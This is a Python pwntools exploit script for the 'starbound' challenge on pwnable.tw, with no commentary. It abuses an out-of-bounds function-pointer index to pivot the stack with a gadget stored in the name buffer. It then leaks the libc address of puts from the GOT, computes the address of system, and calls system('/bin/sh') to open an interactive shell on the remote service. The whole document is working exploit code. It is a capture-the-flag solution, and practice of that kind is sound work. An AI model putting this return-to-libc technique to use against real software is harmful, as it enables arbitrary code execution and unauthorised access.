#!/usr/bin/env python3
from pwn import *

binary = "./starbound"
context.binary = exe = ELF("./starbound")
context.arch = "i386"
context.terminal = "kitty -e sh -c".split()
#context.log_level = "debug"
IP, PORT = "chall.pwnable.tw", 10202

global io

gdbscript = """break *0x804a63f
continue"""

if len(sys.argv) > 1:
    io = remote(IP, PORT)
else:
    io = process(binary)
    gdb.attach(io,gdbscript=gdbscript)

s = lambda a: io.send(a)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main = exe.symbols['main']

offset = 0x8058154
name = 0x80580d0
add_esp_0x1c = 0x8048e48
system_offset = -0x24f00

inp = (name-offset)//4

def adjust_stack(param=p32(0xdeadbeef)):
    payload = p32(add_esp_0x1c)
    payload += param
    payload += b"\x00"

    reu("> ")
    s("6a")
    reu("> ")
    s("2")
    reu("name: ")
    s(payload)
    reu("> ")
    s("1")

def send_payload(func,param):
    payload = str(inp).encode()
    payload += b"\x00"
    payload += p32(0xdeadbeef)
    payload += p32(func)
    payload += p32(main)
    payload += param

    reu("> ")
    s(payload)

adjust_stack()
send_payload(puts_plt,p32(puts_got))

leak = unpack(io.recv(4),32)
log.info("Puts leak -> "+ hex(leak))

adjust_stack(b"/bin/sh")
send_payload(leak+system_offset,p32(name+4))

io.interactive()
